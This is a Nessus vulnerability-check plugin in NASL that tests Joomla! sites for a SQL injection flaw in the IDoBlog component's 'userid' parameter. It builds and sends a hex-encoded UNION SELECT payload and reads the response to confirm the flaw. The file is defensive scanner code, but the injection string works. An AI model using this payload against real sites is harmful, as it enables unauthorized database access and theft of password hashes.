#
# (C) Tenable Network Security, Inc.
#


if (NASL_LEVEL < 3000) exit(1);


include("compat.inc");


if (description)
{
  script_id(41645);
  script_version("$Revision: 1.1 $");

  script_xref(name:"milw0rm", value:"9413");
  script_xref(name:"OSVDB", value:"57013");
  script_xref(name:"Secunia", value:"36243");

  script_name(english:"IDoBlog Component for Joomla! userid Parameter SQL Injection");
  script_summary(english:"Tries to manipulate friend additions");

  script_set_attribute(
    attribute:"synopsis",
    value:string(
      "The remote web server contains a PHP script that is susceptible to\n",
      "a SQL injection attack."
    )
  );
  script_set_attribute(
    attribute:"description", 
    value:string(
      "The remote host is running IDoBlog, a third-party component for\n",
      "Joomla! for blogging.\n",
      "\n",
      "The version of this component installed on the remote host fails to\n",
      "sanitize input to the 'userid' parameter in a GET request (when 'task'\n",
      "is set to 'profile') before using it in database queries.\n",
      "\n",
      "An unauthenticated remote attacker can leverage this issue to\n",
      "manipulate SQL queries and, for example, obtain a list of usernames\n",
      "and password hashes defined to the affected application."
    )
  );
  script_set_attribute(attribute:"solution", 
    value:"Unknown at this time.");

  script_set_attribute(
    attribute:"cvss_vector", 
    value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P"
  );
  script_set_attribute(
    attribute:"vuln_publication_date", 
    value:"2009/08/11"
  );
  script_set_attribute(
    attribute:"plugin_publication_date", 
    value:"2009/09/25"
  );
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0, "Web server does not support PHP scripts.");


# This function converts a string to a concatenation of hex chars so we
# can pass in strings without worrying about PHP's magic_quotes_gpc.
function hexify(str)
{
  local_var hstr, i, l;

  l = strlen(str);
  if (l == 0) return "";

  hstr = "concat(";
  for (i=0; i<l; i++)
    hstr += hex(ord(str[i])) + ",";
  hstr[strlen(hstr)-1] = ")";

  return hstr;
}


# Test an install.
install = get_kb_item(string("www/", port, "/joomla"));
if (isnull(install)) exit(1, "The 'www/"+port+"/joomla' KB item is missing.");
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (isnull(matches)) exit(1, "The 'www/"+port+"/joomla' KB item ("+install+") is invalid.");
dir = matches[2];


# Make sure the component is installed and find an existing user with a blog.
url = string(dir, "/index.php?option=com_idoblog");

res = http_send_recv3(port:port, method:"GET", item:url);
if (isnull(res)) exit(1, "The web server failed to respond.");

if ("option=com_idoblog&amp;task=userblog&amp;userid=" >< res[2])
{
  # Identify a user's blog.
  userid = NULL;

  pat = "option=com_idoblog&amp;task=userblog&amp;userid=([0-9]+)";
  matches = egrep(pattern:pat, string:res[2]);
  if (matches)
  {
    foreach match (split(matches, keep:FALSE))
    {
      item = eregmatch(pattern:pat, string:match);
      if (!isnull(item))
      {
        userid = item[1];
        break;
      }
    }
  }
  if (isnull(userid)) exit(1, "Can't find a user with a blog.");

  exploit = string(userid, " UNION SELECT 1,", hexify(str:SCRIPT_NAME), ",3,4,5,6,7,8,9,10,11,12,13,14,15,16 -- ");
  url = string(
    url,"&",
    "task=profile&",
    "Itemid=1337&",
    "userid=", str_replace(find:" ", replace:"%20", string:exploit)
  );

  res = http_send_recv3(port:port, method:"GET", item:url);
  if (isnull(res)) exit(1, "The web server failed to respond.");

  # There's a problem if we can influence the additions to "our" list of friends.
  if (
    '<b>Was added to friends:</b>' >< res[2] &&
    string(' class="bold4">', SCRIPT_NAME, '</a>') >< res[2]
  )
  {
    set_kb_item(name:'www/'+port+'/SQLInjection', value:TRUE);

    if (report_verbosity > 0)
    {
      report = string(
        "\n",
        "Nessus was able to verify the vulnerability using the following URL :\n",
        "\n",
        "  ", build_url(port:port, qs:url), "\n"
      );
      security_hole(port:port, extra:report);
    }
    else security_hole(port);
    exit(0);
  }
  else exit(0, "The installed IDoBlog component is not affected.");
}
else exit(1, "The IDoBlog component either is not installed or could not be accessed.");
